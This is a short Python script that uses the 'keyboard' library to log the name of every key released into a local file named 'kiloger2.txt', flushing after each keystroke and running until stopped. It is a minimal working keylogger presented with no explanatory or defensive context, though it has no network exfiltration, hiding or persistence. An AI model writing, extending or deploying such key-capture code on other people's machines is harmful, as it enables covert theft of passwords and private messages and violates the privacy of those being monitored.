import keyboard
new_file =open("kiloger2.txt","w")
def new_key(event):
    button = event.name
    print("new event")
    new_file.write(button)
    new_file.flush()

keyboard.on_release(callback = new_key)

keyboard.wait()



 